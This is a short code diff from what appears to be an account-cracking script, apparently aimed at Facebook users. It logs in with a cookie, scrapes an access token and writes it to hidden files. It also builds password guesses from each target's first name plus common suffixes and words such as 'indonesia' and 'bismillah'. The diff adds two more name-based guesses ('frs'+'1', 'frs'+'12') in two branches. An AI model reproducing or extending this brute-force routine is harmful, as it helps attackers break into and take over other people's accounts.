@@ -144,7 +144,6 @@ def login_men():
 		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
 		roq = ses.get(nek,cookies=cookies)
 		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-		
 		ken = open(".tokenakun.txt", "w").write(tok)
 		cok = open(".cookiesakun.txt", "w").write(cookie)
 		baz_anim(f'{puti}└──{hijo} login berhasil jalankan lagi scnya')
@@ -470,6 +469,8 @@ def passwrd():
 						pwv.append(frs+'123456')
 						pwv.append('indonesia')
 						pwv.append('bismillah')
+						pwv.append(frs+'1')
+						pwv.append(frs+'12')
 				else:
 					if len(frs)<3:
 						pwv.append(nmf)
@@ -482,6 +483,8 @@ def passwrd():
 						pwv.append(frs+'123456')
 						pwv.append('indonesia')
 						pwv.append('bismillah')
+						pwv.append(frs+'1')
+						pwv.append(frs+'12')
 
 				if '><basari><' in pwt:
 					for xpwn in pwn:
